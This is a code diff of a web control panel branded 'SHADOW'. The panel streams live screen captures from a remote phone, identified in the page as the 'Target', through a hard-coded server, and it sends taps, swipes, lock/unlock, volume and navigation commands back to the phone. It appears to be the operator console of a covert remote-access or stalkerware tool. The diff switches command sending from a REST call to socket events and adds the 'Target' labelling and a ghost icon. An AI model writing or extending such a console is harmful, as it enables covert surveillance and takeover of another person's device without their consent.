@@ -27,10 +27,7 @@
             padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
             display: flex; justify-content: space-between; align-items: center; z-index: 10;
         }
-        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; display: flex; gap: 10px; align-items: center; }
-        .back-link { color: #888; text-decoration: none; font-size: 0.9rem; margin-right: 15px; cursor: pointer;}
-        .back-link:hover { color: #fff; }
-
+        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
         .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
         .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
         .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
@@ -46,9 +43,9 @@
             background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
             overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
-        #screenStream { width: 100%; height: 100%; object-fit: fill; cursor: crosshair; }
+        #screenStream { width: 100%; height: 100%; object-fit: contain; }
         
-        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; pointer-events: none; }
+        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; }
 
         /* --- Controls --- */
         .side-panel {
@@ -67,8 +64,8 @@
             width: 100%; height: 50px; background: rgba(0, 0, 0, 0.8);
             position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
         }
-        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; width: 30%; text-align: center; }
-        .nav-item:hover { color: white; background: rgba(255,255,255,0.1); }
+        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; }
+        .nav-item:hover { color: white; }
 
         @media (max-width: 768px) {
             .screen-container { flex-direction: column; }
@@ -80,13 +77,10 @@
 <body>
 
     <div class="top-nav">
-        <div class="brand">
-            <a href="index.html" class="back-link"><i class="fa-solid fa-arrow-left"></i></a>
-            SHADOW
-        </div>
+        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW</div>
         <div class="status-badge">
             <span class="live-dot" id="dot"></span> 
-            <span id="statusText" style="color:#888">Waiting...</span>
+            <span id="statusText" style="color:#888">Initializing...</span>
         </div>
     </div>
 
@@ -96,129 +90,123 @@
                 <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
                 <p style="margin-top:10px" id="msgText">Connecting...</p>
             </div>
-            
             <img id="screenStream" src="" alt="" onclick="sendClick(event)">
             
             <div class="nav-bar">
-                <div class="nav-item" onclick="sendCommand('RECENT')"><i class="fa-regular fa-square"></i></div>
-                <div class="nav-item" onclick="sendCommand('HOME')"><i class="fa-regular fa-circle"></i></div>
-                <div class="nav-item" onclick="sendCommand('BACK')"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
+                <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
+                <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
+                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
             </div>
         </div>
 
         <div class="side-panel">
-            <div class="control-btn" onclick="sendCommand('LOCK')" title="Lock Screen"><i class="fa-solid fa-lock"></i></div>
-            <div class="control-btn" onclick="sendCommand('WAKE')" title="Wake Screen"><i class="fa-solid fa-sun"></i></div>
-            <div class="control-btn" onclick="sendCommand('VOL_UP')" title="Vol +"><i class="fa-solid fa-plus"></i></div>
-            <div class="control-btn" onclick="sendCommand('VOL_DOWN')" title="Vol -"><i class="fa-solid fa-minus"></i></div>
-            <div class="control-btn" onclick="sendCommand('SWIPE_UP')" title="Swipe Up"><i class="fa-solid fa-arrow-up"></i></div>
-            <div class="control-btn" onclick="sendCommand('SWIPE_DOWN')" title="Swipe Down"><i class="fa-solid fa-arrow-down"></i></div>
+            <div class="control-btn" onclick="sendCommand('lock')" title="Lock Screen"><i class="fa-solid fa-lock"></i></div>
+            <div class="control-btn" onclick="sendCommand('unlock')" title="Wake Screen"><i class="fa-solid fa-lock-open"></i></div>
+            <div class="control-btn" onclick="sendCommand('volume_up')" title="Vol +"><i class="fa-solid fa-plus"></i></div>
+            <div class="control-btn" onclick="sendCommand('volume_down')" title="Vol -"><i class="fa-solid fa-minus"></i></div>
+            <div class="control-btn" onclick="sendCommand('swipe_up')" title="Swipe Up"><i class="fa-solid fa-arrow-up"></i></div>
+            <div class="control-btn" onclick="sendCommand('swipe_down')" title="Swipe Down"><i class="fa-solid fa-arrow-down"></i></div>
         </div>
     </div>
 
     <script>
-        const API_BASE = "https://child-v9no.onrender.com"; 
-        let socket = null;
+        const SERVER_URL = "https://child-v9no.onrender.com"; 
+        let socket = null; // Defined explicitly
         let currentDeviceId = null;
 
+        // 1. Start logic ONLY when page is ready
         window.addEventListener('load', function() {
             const urlParams = new URLSearchParams(window.location.search);
             currentDeviceId = urlParams.get('id');
 
             if (currentDeviceId) {
-                document.getElementById('statusText').innerText = "Device: " + currentDeviceId;
-                startConnection();
+                document.getElementById('statusText').innerText = "Target: " + currentDeviceId;
+                startConnection(); // Call connection logic
             } else {
                 document.getElementById('statusText').innerText = "No ID Found";
                 document.getElementById('msgText').innerText = "Error: Invalid Link";
+                document.getElementById('statusText').style.color = "var(--danger)";
             }
         });
 
         function startConnection() {
-            // 1. Socket is ONLY for Video Stream
-            socket = io(API_BASE, { 
-                transports: ['websocket', 'polling']
+            // Check if IO library is loaded
+            if (typeof io === 'undefined') {
+                alert("Error: Socket.io library failed to load. Check internet.");
+                return;
+            }
+
+            // Initialize Socket
+            socket = io(SERVER_URL, { 
+                transports: ['websocket', 'polling'], // Fallback options added
+                reconnection: true
             });
 
+            // 2. Event Listeners Setup
             socket.on("connect", () => {
                 console.log("Web Connected!");
-                document.getElementById('statusText').innerText = "Online";
+                document.getElementById('statusText').innerText = "Online: " + currentDeviceId;
                 document.getElementById('statusText').style.color = "var(--accent)";
                 document.getElementById('dot').classList.add("active");
                 
-                // Join as Web Client
-                socket.emit("join-web", currentDeviceId); 
+                // IMPORTANT FIX: Join the SPECIFIC Device Room, not 'admin_monitor'
+                console.log("Joining Room: " + currentDeviceId);
+                socket.emit("join", currentDeviceId); 
             });
 
             socket.on("disconnect", () => {
+                console.log("Disconnected");
                 document.getElementById('statusText').innerText = "Offline";
                 document.getElementById('statusText').style.color = "var(--danger)";
                 document.getElementById('dot').classList.remove("active");
                 document.getElementById('offlineMsg').style.display = "flex";
-                document.getElementById('screenStream').style.display = "none";
+                document.getElementById('msgText').innerText = "Server Disconnected";
             });
 
-            // Receive Image Data
+            // 3. Receive Image
             socket.on("screen-data", (data) => {
+                // Since we joined the specific room, all data receiving here is for us
+                console.log("Image Recieved!"); // Debug log
                 document.getElementById('offlineMsg').style.display = "none";
-                const img = document.getElementById('screenStream');
-                img.style.display = "block";
-                
-                if(data.image) {
-                    img.src = "data:image/jpeg;base64," + data.image;
-                }
+                document.getElementById('screenStream').src = "data:image/jpeg;base64," + data.image;
+            });
+
+            socket.on("connect_error", (err) => {
+                console.error("Connection Error:", err);
             });
         }
 
-        // 2. Fetch API for Sending Commands (Replaces socket.emit)
         function sendCommand(action) {
-            if(!currentDeviceId) return;
+            if(!socket || !currentDeviceId) {
+                console.warn("Socket not connected or No ID");
+                return;
+            }
+            navigator.vibrate(50);
             
-            // Haptic Feedback
-            if(navigator.vibrate) navigator.vibrate(50);
-            
-            console.log("Sending Command:", action);
-
-            fetch(`${API_BASE}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    device_id: currentDeviceId,
-                    command: action
-                })
-            }).catch(err => console.error("Command Error:", err));
+            socket.emit("control-event", {
+                room: currentDeviceId,
+                action: action,
+                x: 0, y: 0
+            });
         }
 
-        // 3. Handle Clicks (Tap on screen)
         function sendClick(event) {
-            if(!currentDeviceId) return;
-
+            if(!socket || !currentDeviceId) return;
+            
             const img = document.getElementById('screenStream');
             const rect = img.getBoundingClientRect();
             
-            // Calculate relative coordinates
             const x = Math.round(event.clientX - rect.left);
             const y = Math.round(event.clientY - rect.top);
-            
-            // Get Image actual dimensions for scaling if needed
-            const width = rect.width;
-            const height = rect.height;
 
-            console.log(`Click at: ${x}, ${y}`);
-
-            fetch(`${API_BASE}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    device_id: currentDeviceId,
-                    command: "CLICK",
-                    x: x,
-                    y: y,
-                    width: width,   // Send screen width/height so android can calculate scale
-                    height: height
-                })
-            }).catch(err => console.error("Click Error:", err));
+            socket.emit("control-event", {
+                room: currentDeviceId,
+                action: "click",
+                x: x,
+                y: y
+            });
         }
     </script>
 </body>
 </html>
+
